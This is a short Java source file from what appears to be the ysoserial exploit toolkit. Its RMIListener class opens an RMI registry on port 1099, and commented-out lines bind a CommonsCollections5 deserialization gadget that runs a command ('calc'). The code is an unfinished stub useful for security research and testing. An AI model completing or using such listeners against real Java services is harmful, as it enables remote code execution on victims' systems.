package ysoserial.exploit;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import ysoserial.payloads.CommonsCollections5;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIListener {
        public static void rmi_factory(String className, String func, String arg) throws Exception {
        //        new ELProcessor().eval("System.out.println(\"aaaa\")");
        LocateRegistry.createRegistry(1099);
//        LocateRegistry.getRegistry("127.0.0.1",1099).bind("Hello",new CommonsCollections5().getObject("calc"));
//        Reference ref = new Reference();
//        registry.bind("aa", refObjWrapper);
    }
}
